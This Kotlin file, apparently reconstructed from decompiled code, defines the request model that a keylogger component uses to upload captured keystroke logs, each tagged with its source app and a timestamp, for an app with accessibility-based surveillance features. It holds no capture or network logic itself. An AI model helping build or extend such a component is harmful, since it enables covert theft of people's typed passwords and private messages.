package com.hawkshaw.library.datalayer.models.accessibility

// Ensure this import is correct for your Room entity
import com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
// Imports from decompiled Java for completeness, though not always directly used in Kotlin source
import kotlinx.serialization.KSerializer
import kotlinx.serialization.descriptors.SerialDescriptor

@Serializable // Corresponds to @f in Java
data class PushKeyLogsRequest(
    @SerialName("logs")
    val logs: List<KeyLog>
) {
    @Serializable // Corresponds to @f in Java
    data class KeyLog(
        @SerialName("type")
        val type: KeyLogEntity.Type, // Aligned with Java's KeyLogEntity.Type

        @SerialName("message")
        val message: String,

        @SerialName("package_name")
        val packageName: String,

        @SerialName("timestamp")
        val timestamp: Long = System.currentTimeMillis() // Explicitly define default timestamp
    ) {
        // Companion object for serializer access, generated by @Serializable
        // public static final Companion Companion = new Companion((j3.f) null);
        // This is implicitly generated by @Serializable on the data class
        // You could explicitly define it, but it's not strictly necessary for 1:1 functional match.
        // companion object {
        //     fun serializer(): KSerializer<KeyLog> {
        //         return PushKeyLogsRequest$KeyLog$$serializer.INSTANCE // This is a generated serializer
        //     }
        // }
    }
}
